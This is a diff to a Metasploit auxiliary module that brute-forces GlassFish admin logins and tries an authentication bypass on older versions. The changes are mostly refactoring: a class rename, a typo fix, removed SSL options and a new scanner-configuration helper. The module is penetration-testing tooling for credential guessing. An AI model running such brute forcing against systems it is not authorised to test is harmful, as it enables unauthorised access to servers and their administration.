@@ -7,7 +7,7 @@ require 'msf/core'
 require 'metasploit/framework/login_scanner/glassfish'
 require 'metasploit/framework/credential_collection'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'GlassFish Brute Force Utility',
       'Description'    => %q{
         This module attempts to login to GlassFish instance using username and password
-        combindations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
+        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
         It will also try to do an authentication bypass against older versions of GlassFish.
         Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
         to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
@@ -42,8 +42,6 @@ class Metasploit3 < Msf::Auxiliary
         # There is no TARGETURI because when Glassfish is installed, the path is /
         Opt::RPORT(4848),
         OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
-        OptBool.new('SSL', [false, 'Negotiate SSL for outgoing connections', false]),
-        OptEnum.new('SSLVersion', [false, 'Specify the version of SSL that should be used', 'TLS1', ['SSL2', 'SSL3', 'TLS1']])
       ], self.class)
   end
 
@@ -51,11 +49,6 @@ class Metasploit3 < Msf::Auxiliary
   # Module tracks the session id, and then it will have to pass the last known session id to
   # the LoginScanner class so the authentication can proceed properly
   #
-
-  # Overrides the ssl method from HttpClient
-  def ssl
-    @scanner.ssl || datastore['SSL']
-  end
 
   #
   # For a while, older versions of Glassfish didn't need to set a password for admin,
@@ -95,16 +88,13 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
-      host:               ip,
-      port:               rport,
-      proxies:            datastore["PROXIES"],
-      cred_details:       @cred_collection,
-      stop_on_success:    datastore['STOP_ON_SUCCESS'],
-      connection_timeout: 5
+      configure_http_login_scanner(
+        cred_details:       @cred_collection,
+        stop_on_success:    datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5
+      )
     )
-
-    @scanner.ssl         = datastore['SSL']
-    @scanner.ssl_version = datastore['SSLVERSION']
   end
 
   def do_report(ip, port, result)
@@ -141,11 +131,9 @@ class Metasploit3 < Msf::Auxiliary
       when Metasploit::Model::Login::Status::SUCCESSFUL
         print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
         do_report(ip, rport, result)
-        :next_user
       when Metasploit::Model::Login::Status::DENIED_ACCESS
         print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
         do_report(ip, rport, result)
-        :next_user
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
         if datastore['VERBOSE']
           print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
@@ -160,7 +148,6 @@ class Metasploit3 < Msf::Auxiliary
             realm_value: result.credential.realm,
             status: result.status
         )
-        :abort
       when Metasploit::Model::Login::Status::INCORRECT
         if datastore['VERBOSE']
           print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
